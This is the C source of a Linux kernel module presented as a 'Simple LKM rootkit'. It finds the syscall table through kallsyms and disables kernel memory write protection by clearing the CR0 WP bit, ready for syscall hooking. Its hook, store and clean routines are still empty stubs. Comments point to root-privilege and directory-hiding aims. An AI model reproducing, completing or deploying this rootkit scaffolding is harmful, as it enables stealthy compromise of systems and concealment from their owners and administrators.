#include <linux/init.h>//Macros and function for the lkm __init and __exit 
#include <linux/module.h>//Core header for LKMs into the kernel
#include <linux/kernel.h>//Type macros fuctions for the kernel e.g. KERN_INFO..
#include <linux/version.h>//Contains predefined macros for version
#include <linux/kallsyms.h> //Contains syscall table functions e.g kallsyms_lookup_name..
#include <linux/unistd.h> //Contains syscall  Numbers
#include <asm/paravirt.h> //Contains functions for cr0_write/cr0_read need it for memory
#include <linux/dirent.h> //Contains dirent structs etc
#include <linux/cred.h>  //Contains the cred structure to give root
#include <linux/uidgid.h>
#include <linux/signal.h>

unsigned long * __sys_call_table; 

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1

#else 

#endif 
#endif




static int clean(void)
{
	printk(KERN_INFO "Cleaned\n");
       return 0;	
}	



static int hook(void)
{

	return 0;
	
}

static int store(void){
#if PTREGS_SYSCALL_STUB
	
	printk(KERN_INFO "orig_kill table entry stored 0\n");	
#else 
	
	printk(KERN_INFO "orig_kill table entry stored 1\n");
#endif
	return 0;
}


unsigned long * get_sys_calltable(void){
     unsigned long * sys_calltable=NULL;

   /*If LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0) */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
     sys_calltable = (unsigned long*) kallsyms_lookup_name("sys_call_table");
#else 
     return NULL;
#endif
     
     return sys_calltable;
}

static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void
protect_memory(void)
{
    write_cr0_forced(read_cr0());
    printk(KERN_INFO "****** protected the memory ******\n");
}

static inline void
unprotect_memory(void)
{
	write_cr0_forced(read_cr0() & ~0x00010000);
	printk(KERN_INFO "****** unprotected the memory ******\n");
}



	int err=1;
static int __init m4lisio_init(void){
	printk(KERN_INFO "Rootkit: init\n");
	__sys_call_table= get_sys_calltable();
	if(!__sys_call_table){
		printk(KERN_INFO "Sys_call_table error\n");
		return err;
	}
	if(store() == err){
		printk(KERN_INFO "error: sys_call store err\n");
		return err;
	}

	unprotect_memory();
	if(hook() == err){
		printk(KERN_INFO "error: hook  err\n");
		return err;
	}

	protect_memory();
	return 0;
}

static void __exit m4lisio_exit(void){
	printk(KERN_INFO "Rootkit: exit\n");
	unprotect_memory();
	if(clean() == err){printk(KERN_INFO "clean err\n");}
	protect_memory();
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("m4lisio");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("Simple LKM rootkit");

module_init(m4lisio_init);
module_exit(m4lisio_exit);